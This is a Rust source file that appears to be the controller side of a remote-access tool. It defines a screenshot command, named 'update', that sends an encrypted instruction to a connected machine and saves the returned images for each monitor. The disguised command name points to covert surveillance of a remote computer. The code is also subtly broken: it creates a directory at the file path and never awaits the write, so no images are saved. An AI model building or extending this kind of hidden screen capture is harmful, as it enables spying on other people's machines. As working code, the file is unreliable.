use std::{borrow::BorrowMut, fmt::format};

use tokio::fs::{self, File};

use crate::connector_server::instance::Instance;

#[derive(Debug, Clone)]

pub struct Screenshot {
    name: String,
}

impl Screenshot {
    pub fn new() -> Screenshot {
        Screenshot {
            name: "update".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }
    pub async fn run(&self, instance: &mut Instance) {
        instance
            .send_hybrid_encryption(
                instance.get_public_key().clone(),
                "screenshot".as_bytes().to_vec(),
            )
            .await;
        let message = instance.accept_message().await;
        let number_of_screenshots = String::from_utf8(message.as_slice().to_vec())
            .unwrap()
            .parse::<i32>()
            .unwrap();
        let mut screenshot_files = Vec::new();
        //for each monitor create files
        for index in 0..number_of_screenshots {
            //make it be more specific with current date or moni name
            let path = format!("/users/{}/screenshot{index}.png", instance.get_path());
            fs::create_dir_all(path.clone()).await.unwrap();
            File::open(path.clone()).await.unwrap();
            screenshot_files.push(path);
        }
        //for each monitor write in path screenshot
        for index in 0..number_of_screenshots {
            let message = instance.accept_message().await;
            fs::write(screenshot_files.get(index as usize).unwrap(), message);
        }
    }
}
